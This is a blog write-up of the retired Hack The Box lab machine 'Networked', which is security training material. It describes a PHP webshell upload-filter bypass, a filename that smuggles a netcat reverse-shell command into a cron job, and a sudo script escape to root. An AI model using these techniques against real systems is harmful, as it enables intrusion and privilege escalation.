---
layout: post
title:  "HTB - Networked"
date:   2020-06-07 23:00 +0100
tags: writeups
initial: 2019-09-07
---
Writeup for the retired HTB machine Networked  
Link: https://www.hackthebox.eu/home/machines/profile/203  
IP: 10.10.10.146

<!--more-->

## Recon

The box has a web service on port 80 running, so common URL paths are in focus.

## gobuster
```
/index.php (Status: 200)
/uploads (Status: 301)
/photos.php (Status: 200)
/upload.php (Status: 200)
/lib.php (Status: 200)
/backup (Status: 301)
```
A complete backup of the website source code can be found in the `/backup` folder.  
As code access is at hand, the next step is to try and get a webshell up and running.  
It seems that upload filters are in place, which [can be tricked](https://github.com/xapax/security/blob/master/bypass_image_upload.md).  
The uploader can be tricked by renaming the payload to `file.php;.jpg`. This renders the last extension as a comment for PHP but bypasses the filter.
This results in the file being uploaded and makes the shell available for use.

## Getting a full user
Enumerating common priviledge escalation paths, a regular running cron job named `check_attack.php` in the user home folder can be discovered.


The script does its heavy lifting in `/var/www/html/uploads` and [based on tricks shared in this article](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt), one could try to create a file with a name like  
`touch ";nc -c bash 10.10.15.195 4444"`  
Which yields an incoming connection with user privileges (*guly*) on the next cron run.


## Road to root
Checking common escalation paths from this user, it turns out the user is allowed to run a script named `changename.sh` with root privileges.

```
---
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh

```
Looking at `changename.sh` yields that we're interested in escaping the predefined vars.  
Once seen, it's kind of easy. Fill out all names without spaces.  
After close inspection it turns out that if all names are filled without spaces and the last variable is named `asd bash`, a root shell is spawned.